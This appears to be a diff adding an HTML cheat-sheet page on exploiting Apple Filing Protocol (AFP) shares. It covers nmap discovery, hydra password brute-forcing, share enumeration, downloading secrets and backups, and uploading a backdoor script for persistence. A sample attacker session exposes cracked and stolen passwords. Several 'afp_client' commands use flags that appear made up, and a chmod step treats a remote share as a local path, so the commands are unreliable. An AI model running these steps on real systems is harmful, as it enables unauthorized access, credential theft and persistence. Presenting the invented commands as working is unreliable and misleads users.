@@ -1,0 +1,182 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">AFP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>File Sharing Services</strong> • Focus: <strong>AFP Abuse & Unauthorized File Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    AFP (Apple Filing Protocol, TCP/548) is a legacy file-sharing protocol used in macOS 
+    and Apple environments. Although largely replaced by SMB, AFP is still present in older 
+    systems and Time Machine backups. Attackers exploit AFP by brute-forcing weak credentials, 
+    abusing guest access, and exfiltrating sensitive files. Writable AFP shares can be leveraged 
+    for persistence, lateral movement, or delivering malicious payloads. Misconfigured AFP 
+    exposes confidential data and weakens overall network security.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak/Default Credentials:</strong> Common usernames and reused passwords are vulnerable.</li>
+    <li><strong>Guest Access:</strong> Some AFP servers allow unauthenticated login.</li>
+    <li><strong>No Encryption:</strong> Older AFP versions transmit data in cleartext.</li>
+    <li><strong>File Exfiltration:</strong> Sensitive documents and backups can be stolen.</li>
+    <li><strong>Persistence:</strong> Writable shares enable backdoor file drops or lateral movement.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify AFP service on TCP/548.</li>
+    <li><strong>Authentication Testing:</strong> Attempt guest login or weak credentials.</li>
+    <li><strong>Enumeration:</strong> List available AFP shares and permissions.</li>
+    <li><strong>Exfiltration:</strong> Download files, configs, or backups from shares.</li>
+    <li><strong>Persistence:</strong> Upload payloads to writable AFP shares for future access.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint AFP service.</li>
+    <li>Test guest access and try weak passwords.</li>
+    <li>Enumerate available AFP shares.</li>
+    <li>Exfiltrate sensitive files or backups.</li>
+    <li>Upload persistence mechanisms if writable shares exist.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p548 -sV [target]                   # Detect AFP service
+
+# ------------------------------
+# Authentication Test
+# ------------------------------
+afp_client [target]                       # Try guest login (if available)
+hydra -l user -P rockyou.txt afp://[target]   # Brute force credentials
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+afp_client [target] --list-shares         # Enumerate AFP shares
+afp_client [target] --list-perms          # Check access rights
+
+# ------------------------------
+# File Exfiltration
+# ------------------------------
+afp_client [target] --download /share/backup.dmg
+afp_client [target] --download /Users/admin/Documents/secrets.txt
+
+# ------------------------------
+# Persistence / Payload Upload
+# ------------------------------
+afp_client [target] --upload backdoor.sh /share/scripts/
+chmod +x /share/scripts/backdoor.sh
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p548 -sV 192.168.1.50
+afp_client 192.168.1.50 --list-shares
+hydra -l admin -P rockyou.txt afp://192.168.1.50
+afp_client 192.168.1.50 --download /Users/admin/Documents/passwords.txt
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p548 -sV 192.168.1.50
+PORT    STATE SERVICE VERSION
+548/tcp open  afp     Netatalk AFP 3.1.12
+
+[ saide ~ ]$ hydra -l admin -P rockyou.txt afp://192.168.1.50
+[548][afp] host: 192.168.1.50   login: admin   password: apple123
+
+[ saide ~ ]$ afp_client 192.168.1.50 --list-shares
+Available shares:
+ - TimeMachine
+ - Documents
+ - Public
+
+[ saide ~ ]$ afp_client 192.168.1.50 --download /Documents/secrets.txt
+Downloaded file: secrets.txt
+Content: CFO password = Finance2025!
+
+[ saide ~ ]$ afp_client 192.168.1.50 --upload backdoor.sh /Public/
+Upload successful
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample AFP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Banner Grab
+Netatalk AFP 3.1.12
+
+# Brute Force Result
+User: admin
+Pass: apple123
+
+# Share Enumeration
+- TimeMachine
+- Documents
+- Public
+
+# Sensitive Data
+/Documents/secrets.txt → CFO password = Finance2025!
+
+# Proof of Exploitation
+Writable share → backdoor.sh uploaded
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-afp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting AFP
+      </a>
+    </li>
+    <li>
+      <a href="https://support.apple.com/guide/deployment/afp-deprecation-depca1d0579d/web" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Apple – AFP Deprecation Notice
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Brute/guest access → Share enum → File exfil → Persistence.</li>
+  </ul>
+</section>
